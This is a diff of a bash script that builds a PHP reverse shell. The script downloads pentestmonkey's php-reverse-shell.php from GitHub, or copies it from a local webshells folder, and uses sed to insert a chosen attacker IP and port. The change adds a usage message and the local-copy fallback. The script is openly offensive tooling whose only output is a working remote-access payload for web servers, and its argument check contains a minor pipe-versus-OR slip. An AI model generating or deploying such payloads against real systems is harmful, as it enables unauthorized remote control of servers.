@@ -14,12 +14,26 @@ yellow="\e[0;33m\033[1m"
 purple="\e[0;35m\033[1m"
 turquoise="\e[0;36m\033[1m"
 gray="\e[0;37m\033[1m"
-
 ip=$1
 port=$2
-pwd=$(pwd)
-wget "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" > /dev/null 2>&1
-grep '127.0.0.1' php-reverse-shell.php | sed "s/127.0.0.1/$ip/" -i php-reverse-shell.php
-grep '1234' php-reverse-shell.php | sed "s/1234/$port/" -i php-reverse-shell.php
 
-echo -e "\n${yellow}[${end}${blue}*${end}${yellow}] Custom PHP reverse shell generated in ${end}${blue}$pwd${end}"
+function helpPanel(){
+	echo -e "\n${yellow}[!] Usage: ${end}${gray}$0 ${end}${blue}<ip> <port>"
+}
+
+if [ -z "$ip" ] | [ -z "$port" ]; then
+	helpPanel
+else
+	pwd=$(pwd)
+	test -f "/usr/share/webshells/php/php-reverse-shell.php"
+	if [ $? -eq 1 ]; then
+		wget "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" #> /dev/null 2>&1
+	else
+		cp "/usr/share/webshells/php/php-reverse-shell.php" $pwd
+	fi
+	grep '127.0.0.1' php-reverse-shell.php | sed "s/127.0.0.1/$ip/" -i php-reverse-shell.php
+	grep '1234' php-reverse-shell.php | sed "s/1234/$port/" -i php-reverse-shell.php
+
+	echo -e "\n${yellow}[${end}${blue}*${end}${yellow}] Custom PHP reverse shell generated in ${end}${blue}$pwd${end}"
+fi
+
